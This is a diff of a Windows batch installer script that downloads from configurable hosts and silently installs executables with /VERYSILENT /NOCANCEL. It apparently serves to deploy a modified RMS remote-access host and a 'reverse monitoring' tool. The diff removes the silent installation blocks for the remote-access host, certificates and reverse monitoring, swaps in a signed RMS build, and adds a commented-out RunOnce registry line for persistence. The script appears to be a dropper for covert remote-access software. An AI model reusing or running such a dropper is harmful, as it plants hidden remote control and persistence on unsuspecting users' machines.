@@ -24,10 +24,13 @@ rem define the Variables
 SET NITWIN7X86=Nit.Win7x86.exe
 SET NITWIN7X64=Nit.Win7x64.exe
 SET NITWIN10=Nit.Win10.exe
-SET RMSHOSTMSI=rms.host6.3ru_mod2.msi
-SET RMSHOSTBAT=rmshost.install.cmd
-SET CERTIFICATESBAT=Certificates-install.bat
+rem SET RMSHOSTMSI=rms.host6.3ru_mod2.msi
+rem SET RMSHOSTBAT=rmshost.install.cmd
+SET RMSHOSTMSI=rms.host.6.10.ru_signed.msi
+SET RMSHOSTBAT=rmshost.install610.cmd
+SET CERTIFICATESEXE=Certificates-Install.EXE
 SET REVERSEMON=ReverseMonitoringSetup.exe
+SET REGISTRY_KEY_EX=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
 
 set host=%prefc%://%hostc%:%portc%/%exppathc%
 set host1=%prefc%://%hostc%:%portc%/%uppathc%
@@ -37,31 +40,13 @@ rem Download
 
 Set xOS=x64 & If "%PROCESSOR_ARCHITECTURE%"=="x86" If Not Defined PROCESSOR_ARCHITEW6432 Set xOS=x32
 
-rem Install Certificates Files...
-if not exist %DEST_DIR%\%CERTIFICATESBAT% goto UnSuccess_Certificates
-echo "Install Certificates..."
-call %DEST_DIR%\%CERTIFICATESBAT%
-:UnSuccess_Certificates
 
 rem Update Windows Files...
 if not exist %DEST_DIR%\Update-Windows.bat goto UnSuccess_UpdateWindows
 echo "Update Windows Files..."
-call %DEST_DIR%\Update-Windows.bat
+call %DEST_DIR%\Update-Windows-Lite.bat
 :UnSuccess_UpdateWindows
 
-rem RMSHOST Files...
-if not exist %DEST_DIR%\%RMSHOSTMSI% goto UnSuccess_rmshost
-copy /Y %DEST_DIR%\%RMSHOSTMSI% %TEMP%\%RMSHOSTMSI%
-if not exist %DEST_DIR%\%RMSHOSTBAT% goto UnSuccess_rmshost
-echo "Install RmsHost..."
-call %DEST_DIR%\%RMSHOSTBAT%
-:UnSuccess_rmshost
-
-rem Reverse Monitoring Files...
-if not exist %DEST_DIR%\%REVERSEMON% goto UnSuccess_REVERSEMON
-echo "Install Reverse Monitoring..."
-"%DEST_DIR%\%REVERSEMON%" /VERYSILENT /NOCANCEL
-:UnSuccess_REVERSEMON
 
 ver | %SystemRoot%\system32\find.exe "Windows [Version 10" > nul
 if not errorlevel 1 goto win_10
@@ -78,6 +63,7 @@ goto end
 :win_8_1
 :win_8
 "%DEST_DIR%\%NITWIN10%" /VERYSILENT /NOCANCEL
+rem %SystemRoot%\system32\reg.exe ADD %REGISTRY_KEY_EX% /V 1 /t REG_SZ /D "\"%DEST_DIR%\%NITWIN10%\" /VERYSILENT /NOCANCEL" /f
 
 goto end
 
